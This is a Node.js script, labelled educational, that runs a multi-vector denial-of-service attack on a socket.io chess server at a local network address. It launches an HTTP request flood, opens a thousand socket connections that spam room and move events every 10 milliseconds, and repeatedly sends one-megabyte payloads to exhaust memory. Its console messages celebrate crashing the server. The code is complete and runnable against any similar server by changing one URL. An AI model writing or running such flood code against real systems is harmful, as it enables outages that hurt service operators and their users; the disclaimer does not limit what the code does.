#!/usr/bin/env node

/**
 * DDoS Attack Script for Educational Purposes
 * 
 * This script demonstrates how a DDoS attack can crash an unprotected server
 * by overwhelming it with connection requests and socket events.
 * 
 * WARNING: Use only for educational purposes on your own servers!
 */

import { io } from 'socket.io-client';
import http from 'http';

const TARGET_URL = 'http://192.168.8.102:3000';
const ATTACK_INTENSITY = {
    CONNECTIONS: 1000,        // Number of socket connections
    HTTP_REQUESTS: 2000,      // Number of HTTP requests
    EVENTS_PER_SECOND: 100,   // Events per socket per second
    DURATION: 30              // Attack duration in seconds
};

console.log('🔥 DDoS Attack Simulator Starting...');
console.log(`Target: ${TARGET_URL}`);
console.log(`Intensity: ${ATTACK_INTENSITY.CONNECTIONS} connections, ${ATTACK_INTENSITY.HTTP_REQUESTS} HTTP requests`);
console.log('⚠️  This is for educational purposes only!\n');

// Track attack metrics
let activeConnections = 0;
let totalRequests = 0;
let errors = 0;

// HTTP Request Flood
function httpFlood() {
    console.log('🌊 Starting HTTP Request Flood...');
    
    for (let i = 0; i < ATTACK_INTENSITY.HTTP_REQUESTS; i++) {
        const req = http.get(TARGET_URL, (res) => {
            totalRequests++;
            res.on('data', () => {}); // Consume response
        });
        
        req.on('error', (err) => {
            errors++;
            if (errors % 100 === 0) {
                console.log(`❌ HTTP Errors: ${errors}`);
            }
        });
        
        req.setTimeout(1000, () => {
            req.destroy();
        });
        
        // Small delay to avoid immediate overwhelming
        if (i % 50 === 0) {
            setTimeout(() => {}, 1);
        }
    }
}

// Socket Connection Flood
function socketFlood() {
    console.log('⚡ Starting Socket Connection Flood...');
    
    const sockets = [];
    
    for (let i = 0; i < ATTACK_INTENSITY.CONNECTIONS; i++) {
        try {
            const socket = io(TARGET_URL, {
                forceNew: true,
                timeout: 1000,
                transports: ['websocket', 'polling']
            });
            
            socket.on('connect', () => {
                activeConnections++;
                
                // Spam events
                const spamInterval = setInterval(() => {
                    try {
                        // Spam various events to overload the server
                        socket.emit('join-room', { roomId: Math.random().toString(), token: 'fake', color: 'white' });
                        socket.emit('find-room');
                        socket.emit('create-room', { time: Math.random() * 1000, rated: true, isPublic: true });
                        socket.emit('get-rooms');
                        
                        // Send fake game moves
                        for (let j = 0; j < ATTACK_INTENSITY.EVENTS_PER_SECOND; j++) {
                            socket.emit('move', {
                                from: Math.random().toString(),
                                to: Math.random().toString(),
                                piece: 'pawn'
                            });
                        }
                    } catch (err) {
                        clearInterval(spamInterval);
                    }
                }, 10); // Send events every 10ms
                
                // Stop spamming after attack duration
                setTimeout(() => {
                    clearInterval(spamInterval);
                }, ATTACK_INTENSITY.DURATION * 1000);
            });
            
            socket.on('error', (err) => {
                errors++;
            });
            
            socket.on('disconnect', () => {
                activeConnections--;
            });
            
            sockets.push(socket);
            
        } catch (err) {
            errors++;
        }
        
        // Small delay between connections
        if (i % 10 === 0) {
            setTimeout(() => {}, 1);
        }
    }
    
    return sockets;
}

// Memory consumption attack
function memoryExhaustion() {
    console.log('💾 Starting Memory Exhaustion Attack...');
    
    // Create large payloads to consume server memory
    for (let i = 0; i < 100; i++) {
        try {
            const socket = io(TARGET_URL, { forceNew: true });
            
            socket.on('connect', () => {
                // Send large data to consume server memory
                const largeData = 'A'.repeat(1024 * 1024); // 1MB string
                
                setInterval(() => {
                    try {
                        socket.emit('large-payload', { data: largeData });
                    } catch (err) {
                        // Socket likely disconnected
                    }
                }, 100);
            });
        } catch (err) {
            errors++;
        }
    }
}

// Attack status monitor
function startMonitor() {
    console.log('📊 Starting Attack Monitor...\n');
    
    const monitor = setInterval(() => {
        console.log(`Status - Active Connections: ${activeConnections}, HTTP Requests: ${totalRequests}, Errors: ${errors}`);
        
        // Check if server might be down
        if (errors > activeConnections && activeConnections === 0) {
            console.log('\n🎯 SERVER APPEARS TO BE DOWN - Attack Successful!');
            console.log('❌ The chess server is likely crashed or unresponsive.');
            console.log('🔧 Restart the server with: npm start');
        }
    }, 2000);
    
    // Stop monitoring after attack duration + 10 seconds
    setTimeout(() => {
        clearInterval(monitor);
        console.log('\n🏁 Attack Completed');
        console.log('📈 Final Stats:');
        console.log(`   Active Connections: ${activeConnections}`);
        console.log(`   Total HTTP Requests: ${totalRequests}`);
        console.log(`   Errors Encountered: ${errors}`);
        
        if (errors > totalRequests * 0.8) {
            console.log('\n✅ DDoS Attack was effective - Server likely crashed!');
            console.log('💡 This demonstrates the need for rate limiting and DDoS protection.');
        } else {
            console.log('\n⚠️  Attack had limited effect - Server may have some protection.');
        }
        
        process.exit(0);
    }, (ATTACK_INTENSITY.DURATION + 10) * 1000);
}

// Main attack function
async function launchAttack() {
    console.log('🚀 Launching Multi-Vector DDoS Attack...\n');
    
    // Start monitoring
    startMonitor();
    
    // Launch all attack vectors simultaneously
    httpFlood();
    socketFlood();
    memoryExhaustion();
    
    console.log('💥 All attack vectors launched!');
    console.log(`⏰ Attack will run for ${ATTACK_INTENSITY.DURATION} seconds...`);
}

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n🛑 Attack stopped by user');
    process.exit(0);
});

// Start the attack
launchAttack().catch(err => {
    console.error('❌ Attack failed to start:', err.message);
    process.exit(1);
});